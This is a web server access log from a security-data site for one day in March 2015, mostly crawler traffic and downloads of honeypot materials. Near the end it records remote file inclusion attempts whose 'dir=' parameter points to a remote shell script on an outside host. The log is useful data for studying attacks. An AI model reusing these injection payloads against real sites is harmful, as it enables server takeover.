119.117.248.176 - - [25/Mar/2015:02:51:03 -0700] "GET /honeypot/BSidesDFW%20-%20201 HTTP/1.1" 404 340 "http://www.secrepo.com/" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17" 
119.117.248.176 - - [25/Mar/2015:02:51:04 -0700] "GET / HTTP/1.1" 200 6806 "http://www.secrepo.com" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17" 
66.249.64.123 - - [25/Mar/2015:03:36:31 -0700] "GET /robots.txt HTTP/1.1" 301 502 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.192 - - [25/Mar/2015:03:36:31 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.127 - - [25/Mar/2015:03:36:31 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
195.211.154.40 - - [25/Mar/2015:03:44:28 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 414640 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) )" 
199.59.148.209 - - [25/Mar/2015:04:31:53 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.209 - - [25/Mar/2015:04:31:53 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
104.130.161.115 - - [25/Mar/2015:04:52:31 -0700] "GET /honeypot/BSidesDFW%2B-%2B2014.ipynb HTTP/1.1" 301 486 "-" "Tornado-Async-Client" 
104.130.161.115 - - [25/Mar/2015:04:52:31 -0700] "GET /honeypot/BSidesDFW+-+2014.ipynb HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
195.211.154.40 - - [25/Mar/2015:04:52:47 -0700] "GET http://www.secrepo.com/honeypot/BSidesDFW+-+2014.ipynb HTTP/1.0" 404 284 "http://www.secrepo.com/honeypot/BSidesDFW+-+2014.ipynb" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" 
195.211.154.40 - - [25/Mar/2015:04:52:47 -0700] "GET / HTTP/1.0" 200 22134 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" 
104.130.161.114 - - [25/Mar/2015:04:55:28 -0700] "GET /honeypot/BSidesDFW HTTP/1.1" 301 460 "-" "Tornado-Async-Client" 
104.130.161.114 - - [25/Mar/2015:04:55:28 -0700] "GET /honeypot/BSidesDFW HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [25/Mar/2015:04:59:43 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.114 - - [25/Mar/2015:04:59:44 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
195.211.154.40 - - [25/Mar/2015:04:59:44 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 302220 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
199.59.148.210 - - [25/Mar/2015:05:03:11 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.210 - - [25/Mar/2015:05:03:11 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
66.249.64.192 - - [25/Mar/2015:05:12:36 -0700] "GET / HTTP/1.1" 200 6807 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
104.130.161.115 - - [25/Mar/2015:05:36:00 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.115 - - [25/Mar/2015:05:36:00 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
195.211.154.40 - - [25/Mar/2015:05:36:02 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 324120 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) )" 
104.130.161.114 - - [25/Mar/2015:06:09:34 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.114 - - [25/Mar/2015:06:09:34 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
195.211.155.186 - - [25/Mar/2015:06:14:21 -0700] "GET /honeypot/BSidesDFW HTTP/1.1" 404 340 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.0.3705)" 
194.244.43.243 - - [25/Mar/2015:06:35:22 -0700] "GET / HTTP/1.1" 200 6807 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10" 
194.244.43.243 - - [25/Mar/2015:06:35:23 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10" 
194.244.43.243 - - [25/Mar/2015:06:35:23 -0700] "GET / HTTP/1.1" 200 6806 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4" 
194.244.43.243 - - [25/Mar/2015:06:35:23 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "com.apple.WebKit.WebContent/10600.4.10.7 CFNetwork/720.2.4 Darwin/14.1.0 (x86_64)" 
194.244.43.243 - - [25/Mar/2015:06:35:23 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "com.apple.WebKit.WebContent/10600.4.10.7 CFNetwork/720.2.4 Darwin/14.1.0 (x86_64)" 
66.249.83.252 - - [25/Mar/2015:06:36:53 -0700] "GET / HTTP/1.1" 200 6807 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon" 
66.249.83.252 - - [25/Mar/2015:06:36:53 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon" 
54.161.171.248 - - [25/Mar/2015:06:44:51 -0700] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)" 
54.161.171.248 - - [25/Mar/2015:06:44:58 -0700] "GET / HTTP/1.1" 200 22145 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)" 
14.147.119.130 - - [25/Mar/2015:07:14:38 -0700] "GET /honeypot/BSidesDFW HTTP/1.1" 404 340 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;)" 
46.4.79.134 - - [25/Mar/2015:07:27:11 -0700] "GET / HTTP/1.0" 301 461 "-" "-" 
46.4.79.134 - - [25/Mar/2015:07:27:11 -0700] "GET / HTTP/1.0" 200 22134 "-" "-" 
199.16.156.125 - - [25/Mar/2015:07:32:45 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.125 - - [25/Mar/2015:07:32:45 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
199.16.156.124 - - [25/Mar/2015:07:35:41 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.124 - - [25/Mar/2015:07:35:41 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
199.59.148.209 - - [25/Mar/2015:08:13:56 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.211 - - [25/Mar/2015:08:13:56 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.209 - - [25/Mar/2015:08:13:56 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
199.59.148.211 - - [25/Mar/2015:08:13:56 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
66.249.67.160 - - [25/Mar/2015:09:12:36 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.67.152 - - [25/Mar/2015:09:12:36 -0700] "GET / HTTP/1.1" 200 6807 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
78.245.85.24 - - [25/Mar/2015:09:40:16 -0700] "GET / HTTP/1.1" 200 6807 "https://www.google.fr/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
78.245.85.24 - - [25/Mar/2015:09:40:16 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
78.245.85.24 - - [25/Mar/2015:09:40:17 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
78.245.85.24 - - [25/Mar/2015:09:40:44 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629420 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
194.244.43.243 - - [25/Mar/2015:09:44:35 -0700] "GET / HTTP/1.1" 200 6807 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10" 
194.244.43.243 - - [25/Mar/2015:09:44:35 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10" 
199.59.148.211 - - [25/Mar/2015:09:56:45 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.211 - - [25/Mar/2015:09:56:46 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
104.130.161.115 - - [25/Mar/2015:10:20:33 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.115 - - [25/Mar/2015:10:20:33 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
199.59.148.209 - - [25/Mar/2015:11:33:59 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.209 - - [25/Mar/2015:11:34:00 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
199.59.148.210 - - [25/Mar/2015:11:49:52 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.210 - - [25/Mar/2015:11:49:52 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
157.55.39.35 - - [25/Mar/2015:11:50:58 -0700] "GET / HTTP/1.1" 200 6807 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.35 - - [25/Mar/2015:11:57:44 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.35 - - [25/Mar/2015:11:57:44 -0700] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.35 - - [25/Mar/2015:11:58:01 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.67.152 - - [25/Mar/2015:12:26:35 -0700] "GET / HTTP/1.1" 200 6807 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
199.16.156.124 - - [25/Mar/2015:12:32:03 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.126 - - [25/Mar/2015:12:32:03 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.124 - - [25/Mar/2015:12:32:03 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
199.16.156.126 - - [25/Mar/2015:12:32:03 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
199.16.156.126 - - [25/Mar/2015:13:06:25 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.126 - - [25/Mar/2015:13:06:25 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
199.59.148.210 - - [25/Mar/2015:13:21:48 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.209 - - [25/Mar/2015:13:21:48 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.209 - - [25/Mar/2015:13:21:48 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
199.59.148.210 - - [25/Mar/2015:13:21:48 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
104.130.161.115 - - [25/Mar/2015:13:26:48 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.115 - - [25/Mar/2015:13:26:48 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
207.188.17.52 - - [25/Mar/2015:13:48:12 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=6&ved=0CEAQFjAF&url=http%3A%2F%2Fwww.secrepo.com%2Fhoneypot%2FBSidesDFW%2520-%25202014.ipynb&ei=9B4TVb2BEY-xogT2moGoAg&usg=AFQjCNF6yLef0zL3ZZM1DnQjsPWSCxSZ6A&sig2=nqGNzez3Dhyn2LgAc2UeuA&bvm=bv.89217033,d.cGU" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
207.188.17.52 - - [25/Mar/2015:13:48:14 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
180.76.6.150 - - [25/Mar/2015:14:29:10 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 360905 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
199.59.148.210 - - [25/Mar/2015:14:35:37 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.210 - - [25/Mar/2015:14:35:37 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.210 - - [25/Mar/2015:14:35:37 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
199.59.148.210 - - [25/Mar/2015:14:35:37 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
105.237.237.123 - - [25/Mar/2015:15:05:13 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 33099 "http://www.secrepo.com/honeypot/Honeypot%20-%20Howto.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
105.237.237.123 - - [25/Mar/2015:15:05:14 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 206 1246706 "http://www.secrepo.com/honeypot/Honeypot%20-%20Howto.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
105.237.237.123 - - [25/Mar/2015:15:05:20 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
105.237.237.123 - - [25/Mar/2015:15:05:13 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 78512 "https://www.google.co.za/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36" 
176.8.89.30 - - [25/Mar/2015:15:10:08 -0700] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://bristolhotel.com.ua/" "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01" 
176.8.89.30 - - [25/Mar/2015:15:10:08 -0700] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://bristolhotel.com.ua/" "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01" 
176.8.89.30 - - [25/Mar/2015:15:10:09 -0700] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://bristolhotel.com.ua/" "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.01" 
46.119.118.191 - - [25/Mar/2015:15:11:06 -0700] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://blogig.org/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
46.119.118.191 - - [25/Mar/2015:15:11:06 -0700] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://voronezh.assix.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)" 
46.119.118.191 - - [25/Mar/2015:15:11:06 -0700] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://blogig.org/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
46.119.118.191 - - [25/Mar/2015:15:11:06 -0700] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://voronezh.assix.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)" 
46.119.118.191 - - [25/Mar/2015:15:11:07 -0700] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://blogig.org/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)" 
46.119.118.191 - - [25/Mar/2015:15:11:07 -0700] "GET /honeypot/BSidesDFW%2520-%25202014.ipynb HTTP/1.1" 404 239 "http://voronezh.assix.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)" 
62.210.180.9 - - [25/Mar/2015:15:35:09 -0700] "GET /honeypot/Honeypot HTTP/1.0" 404 284 "http://www.secrepo.com/honeypot/Honeypot" "Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.17" 
62.210.180.9 - - [25/Mar/2015:15:35:10 -0700] "GET / HTTP/1.0" 200 22134 "http://www.secrepo.com/" "Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.17" 
199.59.148.209 - - [25/Mar/2015:15:38:56 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.209 - - [25/Mar/2015:15:38:56 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
199.59.148.210 - - [25/Mar/2015:16:03:55 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.210 - - [25/Mar/2015:16:03:55 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
199.16.156.126 - - [25/Mar/2015:16:04:12 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.126 - - [25/Mar/2015:16:04:12 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
199.59.148.211 - - [25/Mar/2015:16:38:27 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.211 - - [25/Mar/2015:16:38:27 -0700] "GET /self.logs/ HTTP/1.1" 200 1858 "-" "Twitterbot/1.0" 
199.16.156.126 - - [25/Mar/2015:16:53:19 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.126 - - [25/Mar/2015:16:53:19 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
110.85.112.216 - - [25/Mar/2015:17:28:53 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 418 584 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" 
199.16.156.125 - - [25/Mar/2015:17:43:16 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.125 - - [25/Mar/2015:17:43:16 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
199.16.156.124 - - [25/Mar/2015:18:43:50 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.124 - - [25/Mar/2015:18:43:50 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
62.210.180.9 - - [25/Mar/2015:18:45:54 -0700] "GET /honeypot/BSidesDFW HTTP/1.0" 404 284 "http://www.secrepo.com/honeypot/BSidesDFW" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36" 
62.210.180.9 - - [25/Mar/2015:18:45:54 -0700] "GET / HTTP/1.0" 200 22134 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36" 
199.16.156.125 - - [25/Mar/2015:19:33:49 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.125 - - [25/Mar/2015:19:33:49 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
199.16.156.126 - - [25/Mar/2015:19:49:05 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.126 - - [25/Mar/2015:19:49:05 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
157.55.39.228 - - [25/Mar/2015:20:38:19 -0700] "GET /maccdc2012/ssh.log.gz HTTP/1.1" 200 182517 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
199.16.156.125 - - [25/Mar/2015:20:57:37 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.125 - - [25/Mar/2015:20:57:37 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
209.147.126.100 - - [25/Mar/2015:21:39:01 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb///bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
209.147.126.100 - - [25/Mar/2015:21:39:02 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb///bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
209.147.126.100 - - [25/Mar/2015:21:39:03 -0700] "POST /honeypot/BSidesDFW%20-%202014.ipynb///bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
209.147.126.100 - - [25/Mar/2015:21:39:04 -0700] "POST /honeypot/BSidesDFW%20-%202014.ipynb///bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
209.147.126.100 - - [25/Mar/2015:21:39:04 -0700] "GET ///bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
209.147.126.100 - - [25/Mar/2015:21:39:05 -0700] "GET ///bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
209.147.126.100 - - [25/Mar/2015:21:39:05 -0700] "POST ///bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
209.147.126.100 - - [25/Mar/2015:21:39:06 -0700] "POST ///bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
209.147.126.100 - - [25/Mar/2015:21:39:07 -0700] "GET /honeypot///bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
209.147.126.100 - - [25/Mar/2015:21:39:08 -0700] "GET /honeypot///bbs/skin/zero_vote/ask_password.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
209.147.126.100 - - [25/Mar/2015:21:39:08 -0700] "POST /honeypot///bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
209.147.126.100 - - [25/Mar/2015:21:39:09 -0700] "POST /honeypot///bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
104.130.161.115 - - [25/Mar/2015:21:41:57 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.115 - - [25/Mar/2015:21:41:57 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
199.16.156.124 - - [25/Mar/2015:21:48:03 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.16.156.124 - - [25/Mar/2015:21:48:03 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
